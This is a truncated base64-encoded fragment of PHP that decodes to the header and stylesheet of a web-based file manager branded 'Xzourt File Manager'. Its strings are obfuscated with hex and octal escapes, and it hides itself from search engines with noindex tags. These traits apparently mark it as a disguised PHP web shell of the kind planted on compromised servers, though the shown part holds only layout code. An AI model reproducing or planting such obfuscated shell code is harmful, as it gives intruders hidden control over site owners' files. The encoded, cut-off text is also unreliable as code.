3Nob3dfaGVhZGVyKCkgeyAkc3ByaXRlc192ZXIgPSAiXHgzMlx4MzBceDMxXHgzNlw2MFx4MzNcNjFceDM1IjsgaGVhZGVyKCJcMTAzXDE1N1x4NmVcMTY0XHg2NVwxNTZcMTY0XDU1XHg1NFx4NzlceDcwXHg2NVx4M2FcNDBceDc0XHg2NVwxNzBceDc0XDU3XDE1MFwxNjRcMTU1XDE1NFw3M1x4MjBcMTQzXHg2OFwxNDFcMTYyXDE2M1x4NjVcMTY0XHgzZFwxNjVceDc0XDE0Nlw1NVx4MzgiKTsgaGVhZGVyKCJcMTA1XDE3MFwxNjBceDY5XDE2Mlx4NjVcMTYzXHgzYVx4MjBceDUzXDE0MVwxNjRceDJjXDQwXDYyXDY2XHgyMFwxMTJceDc1XDE1NFw0MFx4MzFcNzFcNzFceDM3XHgyMFw2MFw2NVw3Mlx4MzBcNjBceDNhXHgzMFx4MzBceDIwXHg0N1x4NGRcMTI0Iik7IGhlYWRlcigiXDEwM1wxNDFceDYzXHg2OFwxNDVcNTVcMTAzXDE1N1wxNTZcMTY0XDE2MlwxNTdcMTU0XHgzYVw0MFwxNTZceDZmXHgyZFx4NzNceDc0XHg2Zlx4NzJcMTQ1XHgyY1w0MFx4NmVceDZmXDU1XDE0M1wxNDFcMTQzXDE1MFx4NjVceDJjXHgyMFx4NmRceDc1XHg3M1x4NzRceDJkXDE2MlwxNDVceDc2XDE0MVx4NmNceDY5XDE0NFwxNDFceDc0XHg2NVw1NFx4MjBceDcwXDE1N1x4NzNceDc0XHgyZFx4NjNceDY4XHg2NVwxNDNcMTUzXDc1XDYwXDU0XHgyMFx4NzBcMTYyXDE0NVx4MmRceDYzXHg2OFx4NjVcMTQzXHg2Ylx4M2RceDMwIik7IGhlYWRlcigiXDEyMFwxNjJceDYxXDE0N1wxNTVceDYxXDcyXDQwXHg2ZVwxNTdceDJkXHg2M1x4NjFceDYzXHg2OFwxNDUiKTsgZ2xvYmFsICRsYW5nLCAkcm9vdF91cmwsICRzdGlja3lfbmF2YmFyLCAkZmF2aWNvbl9wYXRoOyAkaXNTdGlja3lOYXZCYXIgPSAkc3RpY2t5X25hdmJhciA/ICJceDZlXDE0MVx4NzZcMTQyXDE0MVwxNjJceDJkXDE0NlwxNTFceDc4XDE0NVx4NjQiIDogIlx4NmVcMTQxXDE2NlwxNDJceDYxXHg3Mlx4MmRcMTU2XHg2Zlx4NzJceDZkXHg2MVx4NmMiOyA/Pgo8IURPQ1RZUEUgaHRtbD4KPGh0bWw+CjxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLCBzaHJpbmstdG8tZml0PW5vIj4KICAgIDxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSJXZWIgYmFzZWQgRmlsZSBNYW5hZ2VyIGluIFBIUCwgTWFuYWdlIHlvdXIgZmlsZXMgZWZmaWNpZW50bHkgYW5kIGVhc2lseSB3aXRoIFh6b3VydCBGaWxlIE1hbmFnZXIiPgogICAgPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJDQ1AgUHJvZ3JhbW1lcnMiPgogICAgPG1ldGEgbmFtZT0icm9ib3RzIiBjb250ZW50PSJub2luZGV4LCBub2ZvbGxvdyI+CiAgICA8bWV0YSBuYW1lPSJnb29nbGVib3QiIGNvbnRlbnQ9Im5vaW5kZXgiPgogICAgPD9waHAgIGlmICgkZmF2aWNvbl9wYXRoKSB7IGVjaG8gIlx4M2NcMTU0XDE1MVx4NmVceDZiXDQwXDE2MlwxNDVcMTU0XDc1XDQyXDE1MVwxNDNceDZmXHg2ZVx4MjJceDIwXHg2OFwxNjJcMTQ1XHg2Nlx4M2RcNDIiIC4gZm1fZW5jKCRmYXZpY29uX3BhdGgpIC4gIlw0Mlw0MFx4NzRcMTcxXDE2MFx4NjVceDNkXDQyXDE1MVx4NmRcMTQxXHg2N1x4NjVceDJmXDE2MFwxNTZcMTQ3XDQyXHgzZSI7IH0gPz4KICAgIDx0aXRsZT48P3BocCAgZWNobyBmbV9lbmMoQVBQX1RJVExFKTsgPz4KPC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9zdGFja3BhdGguYm9vdHN0cmFwY2RuLmNvbS9ib290c3RyYXAvNC41LjIvY3NzL2Jvb3RzdHJhcC5taW4uY3NzIj4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvZm9udC1hd2Vzb21lLzQuNy4wL2Nzcy9mb250LWF3ZXNvbWUubWluLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL2Vra28tbGlnaHRib3gvNS4zLjAvZWtrby1saWdodGJveC5jc3MiIC8+CiAgICA8P3BocCAgaWYgKEZNX1VTRV9ISUdITElHSFRKUykgeyA/PgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9oaWdobGlnaHQuanMvMTAuNi4wL3N0eWxlcy88P3BocCAgZWNobyBGTV9ISUdITElHSFRKU19TVFlMRTsgPz4KLm1pbi5jc3MiPgogICAgPD9waHAgIH0gPz4KICAgIDxzdHlsZT4KICAgICAgICBib2R5IHsgZm9udC1zaXplOjE0cHg7Y29sb3I6IzIyMjtiYWNrZ3JvdW5kOiNGN0Y3Rjc7IH0KICAgICAgICBib2R5Lm5hdmJhci1maXhlZCB7IG1hcmdpbi10b3A6NTVweDsgfQogICAgICAgIGE6aG92ZXIsIGE6dmlzaXRlZCwgYTpmb2N1cyB7IHRleHQtZGVjb3JhdGlvbjpub25lICFpbXBvcnRhbnQ7IH0KICAgICAgICAqIHsgLXdlYmtpdC1ib3JkZXItcmFkaXVzOjAgIWltcG9ydGFudDstbW96LWJvcmRlci1yYWRpdXM6MCAhaW1wb3J0YW50O2JvcmRlci1yYWRpdXM6MCAhaW1wb3J0YW50OyB9CiAgICAgICAgLmZpbGVuYW1lLCB0ZCwgdGggeyB3aGl0ZS1zcGFjZTpub3dyYXAgIH0KICAgICAgICAubmF2YmFyLWJyYW5kIHsgZm9udC13ZWlnaHQ6Ym9sZDsgfQogICAgICAgIC5uYXYtaXRlbS5hdmF0YXIgYSB7IGN1cnNvcjpwb2ludGVyO3RleHQtdHJhbnNmb3JtOmNhcGl0YWxpemU7IH0KICAgICAgICAubmF2LWl0ZW0uYXZhdGFyIGEgPiBpIHsgZm9udC1zaXplOjE1cHg7IH0KICAgICAgICAubmF2LWl0ZW0uYXZhdGFyIC5kcm9wZG93bi1tZW51IGEgeyBmb250LXNpemU6MTNweDsgfQogICAgICAgICNzZWFyY2gtYWRkb24geyBmb250LXNpemU6MTJweDtib3JkZXItcmlnaHQtd2lkdGg6MDsgfQogICAgICAgICNzZWFyY2gtYWRkb24yIHsgYmFja2dyb3VuZDp0cmFuc3BhcmVudDtib3JkZXItbGVmdDowOyB9CiAgICAgICAgLmJyZWFkLWNydW1iIHsgY29sb3I6I2NjY2NjYztmb250LXN0eWxlOm5vcm1hbDsgfQogICAgICAgICNtYWluLXRhYmxlIC5maWxlbmFtZSBhIHsgY29sb3I6IzIyMjIyMjsgfQogICAgICAgIC50YWJsZSB0ZCwgLnRhYmxlIHRoIHsgdmVydGljYWwtYWxpZ246bWlkZGxlICFpbXBvcnRhbnQ7IH0KICAgICAgICAudGFibGUgLmN1c3RvbS1jaGVja2JveC10ZCAuY3VzdG9tLWNvbnRyb2wuY3VzdG9tLWNoZWNrYm94LCAudGFibGUgLmN1c3RvbS1jaGVja2JveC1oZWFkZXIgLmN1c3RvbS1jb250cm9sLmN1c3RvbS1jaGVja2JveCB7IG1pbi13aWR0aDoxOHB4OyB9CiAgICAgICAgLnRhYmxlLXNtIHRkLCAudGFibGUtc20gdGggeyBwYWRkaW5nOi40cmVtOyB9CiAgICAgICAgLnRhYmxlLWJvcmRlcmVkIHRkLCAudGFibGUtYm9yZGVyZWQgdGggeyBib3JkZXI6MXB4IHNvbGlkICNmMWYxZjE7IH0KICAgICAgICAuaGlkZGVuIHsgZGlzcGxheTpub25lICB9CiAgICAgICAgcHJlLndpdGgtaGxqcyB7IHBhZGRpbmc6MCAgfQogICAgICAgIHByZS53aXRoLWhsanMgY29kZSB7IG1hcmdpbjowO2JvcmRlcjowO292ZXJmbG93OnZpc2libGUgIH0KICAgICAgICBjb2RlLm1heGhlaWdodCwgcHJlLm1heGhlaWdodCB7IG1heC1oZWlnaHQ6NTEycHggIH0KICAgICAgICAuZmEuZmEtY2FyZXQtcmlnaHQgeyBmb250LXNpemU6MS4yZW07bWFyZ2luOjAgNHB4O3ZlcnRpY2FsLWFsaWduOm1pZGRsZTtjb2xvcjojZWNlY2VjICB9CiAgICAgICAgLmZhLmZhLWhvbWUgeyBmb250LXNpemU6MS4zZW07dmVydGljYWwtYWxpZ246Ym90dG9tICB9CiAgICAgICAgLnBhdGggeyBtYXJnaW4tYm90dG9tOjEwcHggIH0KICAgICAgICBmb3JtLmRyb3B6b25lIHsgbWluLWhlaWdodDoyMDBweDtib3JkZXI6MnB4IGRhc2hlZCAjMDA3YmZmO2xpbmUtaGVpZ2h0OjZyZW07IH0KICAgICAgICAucmlnaHQgeyB0ZXh0LWFsaWduOnJpZ2h0ICB9CiAgICAgICAgLmNlbnRlciwgLmNsb3NlLCAubG9naW4tZm9ybSB7IHRleHQtYWxpZ246Y2VudGVyICB9CiAgICAgICAgLm1lc3NhZ2UgeyBwYWRkaW5nOjRweCA3cHg7Ym9yZGVyOjFweCBzb2xpZCAjZGRkO2JhY2tncm91bmQtY29sb3I6I2ZmZiAgfQogICAgICAgIC5tZXNzYWdlLm9rIHsgYm9yZGVyLWNvbG9yOmdyZWVuO2NvbG9yOmdyZWVuICB9CiAgICAgICAgLm1lc3NhZ2UuZXJyb3IgeyBib3JkZXItY29sb3I6cmVkO2NvbG9yOnJlZCAgfQogICAgICAgIC5tZXNzYWdlLmFsZXJ0IHsgYm9yZGVyLWNvbG9yOm9yYW5nZTtjb2xvcjpvcmFuZ2UgIH0KICAgICAgICAucHJldmlldy1pbWcgeyBtYXgtd2lkdGg6MTAwJTtiYWNrZ3JvdW5kOnVybChkYXRhOmltYWdlL3BuZztiYXNlNjQsaVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQUJBQUFBQVFDQUlBQUFDUWtXZzJBQUFBS2tsRVFWUjQybUw1Ly84L0F6YncrUEZqck9KTURDU0NVUTNFQUJaYzRTMHJLenNhU3ZUVEFCQmdBTXlmQ01zWTRCOWlBQUFBQUVsRlRrU3VRbUNDKSAgfQogICAgICAgIC5pbmxpbmUtYWN0aW9ucyA+IGEgPiBpIHsgZm9udC1zaXplOjFlbTttYXJnaW4tbGVmdDo1cHg7YmFja2dyb3VuZDojMzc4NWMxO2NvbG9yOiNmZmY7cGFkZGluZzozcHg7Ym9yZGVyLXJhZGl1czozcHggIH0KICAgICAgICAucHJldmlldy12aWRlbyB7IHBvc2l0aW9uOnJlbGF0aXZlO21heC13aWR0aDoxMDAlO2hlaWdodDowO3BhZGRpbmctYm90dG9tOjYyLjUlO21hcmdpbi1ib3R0b206MTBweCAgfQogICAgICAgIC5wcmV2aWV3LXZpZGVvIHZpZGVvIHsgcG9zaXRpb246YWJzb2x1dGU7d2lkdGg6MTAwJTtoZWlnaHQ6MTAwJTtsZWZ0OjA7dG9wOjA7YmFja2dyb3VuZDojMDAwICB9CiAgICAgICAgLmNvbXBhY3QtdGFibGUgeyBib3JkZXI6MDt3aWR0aDphdXRvICB9CiAgICAgICAgLmNvbXBhY3QtdGFibGUgdGQsIC5jb21wYWN0LXRhYmxlIHRoIHsgd2lkdGg6MTAwcHg7Ym9yZGVyOjA7dGV4dC1hbGlnbjpjZW50ZXIgIH0KICAgICAgICAuY29tcGFjdC10YWJsZSB0cjpob3ZlciB0ZCB7IGJhY2tncm91bmQtY29sb3I6I2ZmZiAgfQogICAgICAgIC5maWxlbmFtZSB7IG1heC13aWR0aDo0MjBweDtvdmVyZmxvdzpoaWRkZW47dGV4dC1vdmVyZmxvdzplbGxpcHNpcyAgfQogICAgICAgIC5icmVhay13b3JkIHsgd29yZC13cmFwOmJyZWFrLXdvcmQ7bWFyZ2luLWxlZnQ6MzBweCAgfQogICAgICAgIC5icmVhay13b3JkLmZsb2F0LWxlZnQgYSB7IGNvbG9yOiM3ZDdkN2QgIH0KICAgICAgICAuYnJlYWstd29yZCArIC5mbG9hdC1yaWdodCB7IHBhZGRpbmctcmlnaHQ6MzBweDtwb3NpdGlvbjpyZWxhdGl2ZSAgfQogICAgICAgIC5icmVhay13b3JkICsgLmZsb2F0LXJpZ2h0ID4gYSB7IGNvbG9yOiM3ZDdkN2Q7Zm9udC1zaXplOjEuMmVtO21hcmdpbi1yaWdodDo0cHggIH0KICAgICAgICAjZWRpdG9yIHsgcG9zaXRpb246YWJzb2x1dGU7cmlnaHQ6MTVweDt0b3A6MTAwcHg7Ym90dG9tOjE1cHg7bGVmdDoxNXB4ICB9CiAgICAgICAgQG1lZGlhIChtYXgtd2lkdGg6NDgxcHgpIHsKICAgICAgICAgICAgI2VkaXRvciB7IHRvcDoxNTBweDsgfQogICAgICAgIH0KICAgICAgICAjbm9ybWFsLWVkaXRvciB7IGJvcmRlci1yYWRpdXM6M3B4O2JvcmRlci13aWR0aDoycHg7cGFkZGluZzoxMHB4O291dGxpbmU6bm9uZTsgfQogICAgICAgIC5idG4tMiB7IGJvcmRlci1yYWRpdXM6MDtwYWRkaW5nOjNweCA2cHg7Zm9udC1zaXplOnNtYWxsOyB9CiAgICAgICAgbGkuZmlsZTpiZWZvcmUsbGkuZm9sZGVyOmJlZm9yZSB7IGZvbnQ6bm9ybWFsIG5vcm1hbCBub3JtYWwgMTRweC8xIEZvbnRBd2Vzb21lO2NvbnRlbnQ6IlxmMDE2IjttYXJnaW4tcmlnaHQ6NXB4IH0KICAgICAgICBsaS5mb2xkZXI6YmVmb3JlIHsgY29udGVudDoiXGYxMTQiIH0KICAgICAgICBpLmZhLmZhLWZvbGRlci1vIHsgY29sb3I6IzAxNTdiMyB9CiAgICAgICAgaS5mYS5mYS1waWN0dXJlLW8geyBjb2xvcjojMjZiOTlhIH0KICAgICAgICBpLmZhLmZhLWZpbGUtYXJjaGl2ZS1vIHsgY29sb3I6I2RhN2Q3ZCB9CiAgICAgICAgLmJ0bi0yIGkuZmEuZmEtZmlsZS1hcmNoaXZlLW8geyBjb2xvcjppbmhlcml0IH0KICAgICAgICBpLmZhLmZhLWNzczMgeyBjb2xvcjojZjM2ZmEwIH0KICAgICAgICBpLmZhLmZhLWZpbGUtY29kZS1vIHsgY29sb3I6IzAwN2JmZiB9CiAgICAgICAgaS5mYS5mYS1jb2RlIHsgY29sb3I6I2NjNGI0YyB9CiAgICAgICAgaS5mYS5mYS1maWxlLXRleHQtbyB7IGNvbG9yOiMwMDk2ZTYgfQogICAgICAgIGkuZmEuZmEtaHRtbDUgeyBjb2xvcjojZDc1ZTcyIH0KICAgICAgICBpLmZhLmZhLWZpbGUtZXhjZWwtbyB7IGNvbG9yOiMwOWM1NWQgfQogICAgICAgIGkuZmEuZmEtZmlsZS1wb3dlcnBvaW50LW8geyBjb2xvcjojZjY3MTJlIH0KICAgICAgICBpLmdvLWJhY2sgeyBmb250LXNpemU6MS4yZW07Y29sb3I6IzAwN2JmZjsgfQogICAgICAgIC5tYWluLW5hdiB7IHBhZGRpbmc6MC4ycmVtIDFyZW07Ym94LXNoYWRvdzowIDRweCA1cHggMCByZ2JhKDAsIDAsIDAsIC4xNCksIDAgMXB4IDEwcHggMCByZ2JhKDAsIDAsIDAsIC4xMiksIDAgMnB4IDRweCAtMXB4IHJnYmEoMCwgMCwgMCwgLjIpICB9CiAgICAgICAgLmRhdGFUYWJsZXNfZmlsdGVyIHsgZGlzcGxheTpub25lOyB9CiAgICAgICAgdGFibGUuZGF0YVRhYmxlIHRoZWFkIC5zb3J0aW5nIHsgY3Vyc29yOnBvaW50ZXI7YmFja2dyb3VuZC1yZXBlYXQ6bm8tcmVwZWF0O2JhY2tncm91bmQtcG9zaXRpb246Y2VudGVyIHJpZ2h0O2JhY2tncm91bmQtaW1hZ2U6dXJsKCdkYXRhOmltYWdlL3BuZztiYXNlNjQsaVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQUJNQUFBQVRDQVFBQUFEWVdmNUhBQUFBa0VsRVFWUW96N1hRTVE1QVFCQ0Y0ZFdRU0p4QzV3d2F4MUNxMWU3QkFkeEQ1U0wrVHEvUUNNMW9OaUppZHdveDAzNTVtWG5HL0RyRXRJUTZhemlvTlpReEkweWtQaFRRSXdoQ1IrQm1CWXRsSzdrTEpZd1dDY0pBOU00cWRyWnJkOHBQalpXUHRPcWRSUXkzMjBZU1YxN09hdEZDNGV1dHM2ejM5R1lNS1JQQ1RLWTlVblBRNlArR3RNUmZHdFBuQkNpcWhBZUpQbWtxQUFBQUFFbEZUa1N1UW1DQycpOyB9CiAgICAgICAgdGFibGUuZGF0YVRhYmxlIHRoZWFkIC5zb3J0aW5nX2FzYyB7IGN1cnNvcjpwb2ludGVyO2JhY2tncm91bmQtcmVwZWF0Om5vLXJlcGVhdDtiYWNrZ3JvdW5kLXBvc2l0aW9uOmNlbnRlciByaWdodDtiYWNrZ3JvdW5kLWltYWdlOnVybCgnZGF0YTppbWFnZS9wbmc7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFCTUFBQUFUQ0FZQUFBQnlVRGJNQUFBQVowbEVRVlE0eTJOZ0dMS2dxdUV1RnhCUEFHSTJhaGhXQ3NTL2dEaWJVb08wZ1BneEVQOEg0dHRBckV5dVFZeEFQQmRxRUF4UEJJbVRZNWdqRUw5RE0rd1RFTnVRYWhBdkVPOURNd2lHZHdBeE95bUdKUUx4VHlEK2pnV0R4Q01aUnNFb0dBVm9BQURlZW13dFBjWkkyd0FBQUFCSlJVNUVya0pnZ2c9PScpOyB9CiAgICAgICAgdGFibGUuZGF0YVRhYmxlIHRoZWFkIC5zb3J0aW5nX2Rlc2MgeyBjdXJzb3I6cG9pbnRlcjtiYWNrZ3JvdW5kLXJlcGVhdDpuby1yZXBlYXQ7YmFja2dyb3VuZC1wb3NpdGlvbjpjZW50ZXIgcmlnaHQ7YmFja2dyb3VuZC1pbWFnZTp1cmwoJ2RhdGE6aW1hZ2UvcG5nO2Jhc2U2NCxpVkJPUncwS0dnb0FBQUFOU1VoRVVnQUFBQk1BQUFBVENBWUFBQUJ5VURiTUFBQUFaVWxFUVZRNHkyTmdHQVdqWUJTZ2dhcUd1NUZBL0JPSXYyUEJJUEZFVWd4akIrSWRRUHdmQzk0SHhMeWt1czRHaUQraEdmUU9pQjNKOFNvakVFOUVNMnd1U0p6Y3NGTUc0dHRRZ3g0RHNSYWxrWkVOeEwrQXVKUWFNY3NHeEJPQW1Hdm9wazhBVnoxc0xaZ2cwYnNBQUFBQVNVVk9SSzVDWUlJPScpOyB9CiAgICAgICAgdGFibGUuZGF0YVRhYmxlIHRoZWFkIHRyOmZpcnN0LWNoaWxkIHRoLmN1c3RvbS1jaGVja2JveC1oZWFkZXI6Zmlyc3QtY2hpbGQgeyBiYWNrZ3JvdW5kLWltYWdlOm5vbmU7IH0KICAgICAgICAuZm9vdGVyLWFjdGlvbiBsaSB7IG1hcmdpbi1ib3R0b206MTBweDsgfQogICAgICAgIC5hcHAtdi10aXRsZSB7IGZvbnQtc2l6ZToyNHB4O2ZvbnQtd2VpZ2h0OjMwMDtsZXR0ZXItc3BhY2luZzotLjVweDt0ZXh0LXRyYW5zZm9ybTp1cHBlcmNhc2U7IH0KICAgICAgICBoci5jdXN0b20taHIgeyBib3JkZXItdG9wOjFweCBkYXNoZWQgIzhjOGI4Yjtib3JkZXItYm90dG9tOjFweCBkYXNoZWQgI2ZmZjsgfQogICAgICAgIC5la2tvLWxpZ2h0Ym94IC5tb2RhbC1kaWFsb2cgeyBtYXgtd2lkdGg6OTglOyB9CiAgICAgICAgLmVra28tbGlnaHRib3gtaXRlbS5mYWRlLmluLnNob3cgLnJvdyB7IGJhY2tncm91bmQ6I2ZmZjsgfQogICAgICAgIC5la2tvLWxpZ2h0Ym94LW5hdi1vdmVybGF5IHsgZGlzcGxheTpmbGV4ICFpbXBvcnRhbnQ7b3BhY2l0eToxICFpbXBvcnRhbnQ7aGVpZ2h0OmF1dG8gIWltcG9ydGFudDt0b3A6NTAlOyB9CiAgICAgICAgLmVra28tbGlnaHRib3gtbmF2LW92ZXJsYXkgYSB7IG9wYWNpdHk6MSAhaW1wb3J0YW50O3dpZHRoOmF1dG8gIWltcG9ydGFudDt0ZXh0LXNoYWRvdzpub25lICFpbXBvcnRhbnQ7Y29sb3I6IzNCM0IzQjsgfQogICAgICAgIC5la2tvLWxpZ2h0Ym94LW5hdi1vdmVybGF5IGE6aG92ZXIgeyBjb2xvcjojMjA1MDdEOyB9CiAgICAgICAgI3NuYWNrYmFyIHsgdmlzaWJpbGl0eTpoaWRkZW47bWluLXdpZHRoOjI1MHB4O21hcmdpbi1sZWZ0Oi0xMjVweDtiYWNrZ3JvdW5kLWNvbG9yOiMzMzM7Y29sb3I6I2ZmZjt0ZXh0LWFsaWduOmNlbnRlcjtib3JkZXItcmFkaXVzOjJweDtwYWRkaW5nOjE2cHg7cG9zaXRpb246Zml4ZWQ7ei1pbmRleDoxO2xlZnQ6NTAlO2JvdHRvbTozMHB4O2ZvbnQtc2l6ZToxN3B4OyB9CiAgICAgICAgI3NuYWNrYmFyLnNob3cgeyB2aXNpYmlsaXR5OnZpc2libGU7LXdlYmtpdC1hbmltYXRpb246ZmFkZWluIDAuNXMsIGZhZGVvdXQgMC41cyAyLjVzO2FuaW1hdGlvbjpmYWRlaW4gMC41cywgZmFkZW91dCAwLjVzIDIuNXM7IH0KICAgICAgICBALXdlYmtpdC1rZXlmcmFtZXMgZmFkZWluIHsgZnJvbSB7IGJvdHRvbTowO29wYWNpdHk6MDsgfQogICAgICAgIHRvIHsgYm90dG9tOjMwcHg7b3BhY2l0eToxOyB9CiAgICAgICAgfQogICAgICAgIEBrZXlmcmFtZXMgZmFkZWluIHsgZnJvbSB7IGJvdHRvbTowO29wYWNpdHk6MDsgfQogICAgICAgIHRvIHsgYm90dG9tOjMwcHg7b3BhY2l0eToxOyB9CiAgICAgICAgfQogICAgICAgIEAtd2Via2l0LWtleWZyYW1lcyBmYWRlb3V0IHsgZnJvbSB7IGJvdHRvbTozMHB4O29wYWNpdHk6MTsgfQogICAgICAgIHRvIHsgYm90dG9tOjA7b3BhY2l0eTowOyB9CiAgICAgICAgfQogICAgICAgIEBrZXlmcmFtZXMgZmFkZW91dCB7IGZyb20geyBib3R0b206MzBweDtvcGFjaXR5OjE7IH0KICAgICAgICB0byB7IGJvdHRvbTowO29wYWNpdHk6MDsgfQogICAgICAgIH0KICAgICAgICAjbWFpbi10YWJsZSBzcGFuLmJhZGdlIHsgYm9yZGVyLWJvdHRvbToycHggc29saWQgI2Y4ZjlmYSB9CiAgICAgICAgI21haW4tdGFibGUgc3Bhbi5iYWRnZTpudGgtY2hpbGQoMSkgeyBib3JkZXItY29sb3I6I2RmNDIyNyB9CiAgICAgICAgI21haW4tdGFibGUgc3Bhbi5iYWRnZTpudGgtY2hpbGQoMikgeyBib3JkZXItY29sb3I6I2Y4YjYwMCB9CiAgICAgICAgI21haW4tdGFibGUgc3Bhbi5iYWRnZTpudGgtY2hpbGQoMykgeyBib3JkZXItY29sb3I6IzAwYmQ2MCB9CiAgICAgICAgI21haW4tdGFibGUgc3Bhbi5iYWRnZTpudGgtY2hpbGQoNCkgeyBib3JkZXItY29sb3I6IzQ1ODFmZiB9CiAgICAgICAgI21haW4tdGFibGUgc3Bhbi5iYWRnZTpudGgtY2hpbGQoNSkgeyBib3JkZXItY29sb3I6I2FjNjhmYyB9CiAgICAgICAgI21haW4tdGFibGUgc3Bhbi5iYWRnZTpudGgtY2hpbGQoNikgeyBib3JkZXItY29sb3I6IzQ1YzNkMiB9CiAgICAgICAgQG1lZGlhIG9ubHkgc2NyZWVuIGFuZCAobWluLWRldmljZS13aWR0aDo3NjhweCkgYW5kIChtYXgtZGV2aWNlLXdpZHRoOjEwMjRweCkgYW5kIChvcmllbnRhdGlvbjpsYW5kc2NhcGUpIGFuZCAoLXdlYmtpdC1taW4tZGV2aWNlLXBpeGVsLXJhdGlvOjIpIHsgLm5hdmJhci1jb2xsYXBzZSAuY29sLXhzLTYudGV4dC1yaWdodCB7IHBhZGRpbmc6MDsgfQogICAgICAgIH0KICAgICAgICAuYnRuLmFjdGl2ZS5mb2N1cywuYnRuLmFjdGl2ZTpmb2N1cywuYnRuLmZvY3VzLC5idG4uZm9jdXM6YWN0aXZlLC5idG46YWN0aXZlOmZvY3VzLC5idG46Zm9jdXMgeyBvdXRsaW5lOjAhaW1wb3J0YW50O291dGxpbmUtb2Zmc2V0OjAhaW1wb3J0YW50O2JhY2tncm91bmQtaW1hZ2U6bm9uZSFpbXBvcnRhbnQ7LXdlYmtpdC1ib3gtc2hhZG93Om5vbmUhaW1wb3J0YW50O2JveC1zaGFkb3c6bm9uZSFpbXBvcnRhbnQgfQogICAgICAgIC5sZHMtZmFjZWJvb2sgeyBkaXNwbGF5Om5vbmU7cG9zaXRpb246cmVsYXRpdmU7d2lkdGg6NjRweDtoZWlnaHQ6NjRweCB9CiAgICAgICAgLmxkcy1mYWNlYm9vayBkaXYsLmxkcy1mYWNlYm9vay5zaG93LW1lIHsgZGlzcGxheTppbmxpbmUtYmxvY2sgfQogICAgICAgIC5sZHMtZmFjZWJvb2sgZGl2IHsgcG9zaXRpb246YWJzb2x1dGU7bGVmdDo2cHg7d2lkdGg6MTNweDtiYWNrZ3JvdW5kOiMwMDdiZmY7YW5pbWF0aW9uOmxkcy1mYWNlYm9vayAxLjJzIGN1YmljLWJlemllcigwLC41LC41LDEpIGluZmluaXRlIH0KICAgICAgICAubGRzLWZhY2Vib29rIGRpdjpudGgtY2hpbGQoMSkgeyBsZWZ0OjZweDthbmltYXRpb24tZGVsYXk6LS4yNHMgfQogICAgICAgIC5sZHMtZmFjZWJvb2sgZGl2Om50aC1jaGlsZCgyKSB7IGxlZnQ6MjZweDthbmltYXRpb24tZGVsYXk6LS4xMnMgfQogICAgICAgIC5sZHMtZmFjZWJvb2sgZGl2Om50aC1jaGlsZCgzKSB7IGxlZnQ6NDVweDthbmltYXRpb24tZGVsYXk6MHMgfQogICAgICAgIEBrZXlmcmFtZXMgbGRzLWZhY2Vib29rIHsgMCUgeyB0b3A6NnB4O2hlaWdodDo1MXB4IH0KICAgICAgICAxMDAlLDUwJSB7IHRvcDoxOXB4O2hlaWdodDoyNnB4IH0KICAgICAgICB9CiAgICAgICAgdWwjc2VhcmNoLXdyYXBwZXIgeyBwYWRkaW5nLWxlZnQ6IDA7Ym9yZGVyOiAxcHggc29saWQgI2VjZWNlY2NjOyB9IHVsI3NlYXJjaC13cmFwcGVyIGxpIHsgbGlzdC1zdHlsZTogbm9uZTsgcGFkZGluZzogNXB4O2JvcmRlci1ib3R0b206IDFweCBzb2xpZCAjZWNlY2VjY2M7IH0KICAgICAgICB1bCNzZWFyY2gtd3JhcHBlciBsaTpudGgtY2hpbGQob2RkKXsgYmFja2dyb3VuZDogI2Y5ZjlmOWNjO30KICAgICAgICAuYy1wcmV2aWV3LWltZyB7CiAgICAgICAgICAgIG1heC13aWR0aDogMzAwcHg7CiAgICAgICAgfQogICAgPC9zdHlsZT4KICAgIDw/cGhwICBpZiAoRk1fVEhFTUUgPT0gIlx4NjRcMTQxXDE2MlwxNTMiKSB7ID8+CiAgICAgICAgPHN0eWxlPgogICAgICAgICAgICBib2R5LnRoZW1lLWRhcmsgeyBiYWNrZ3JvdW5kLWNvbG9yOiAjMmYyYTJhOyB9CiAgICAgICAgICAgIC5saXN0LWdyb3VwIC5saXN0LWdyb3VwLWl0ZW0geyBiYWNrZ3JvdW5kOiAjMzQzYTQwOyB9CiAgICAgICAgICAgIC50aGVtZS1kYXJrIC5uYXZiYXItbmF2IGksIC5uYXZiYXItbmF2IC5kcm9wZG93bi10b2dnbGUsIC5icmVhay13b3JkIHsgY29sb3I6ICNmZmZmZmY7IH0KICAgICAgICAgICAgYSwgYTpob3ZlciwgYTp2aXNpdGVkLCBhOmFjdGl2ZSwgI21haW4tdGFibGUgLmZpbGVuYW1lIGEgeyBjb2xvcjogIzAwZmYxZjsgfQogICAgICAgICAgICB1bCNzZWFyY2gtd3JhcHBlciBsaTpudGgtY2hpbGQob2RkKSB7IGJhY2tncm91bmQ6ICNmOWY5ZjljYzsgfQogICAgICAgICAgICAudGhlbWUtZGFyayAuYnRuLW91dGxpbmUtcHJpbWFyeSB7IGNvbG9yOiAjMDBmZjFmOyBib3JkZXItY29sb3I6ICMwMGZmMWY7IH0KICAgICAgICAgICAgLnRoZW1lLWRhcmsgLmJ0bi1vdXRsaW5lLXByaW1hcnk6aG92ZXIsIC50aGVtZS1kYXJrIC5idG4tb3V0bGluZS1wcmltYXJ5OmFjdGl2ZSB7IGJhY2tncm91bmQtY29sb3I6ICMwMjgyMTE7fQogICAgICAgIDwvc3R5bGU+CiAgICA8P3BocCAgfSA/Pgo8L2hlYWQ+Cjxib2R5IG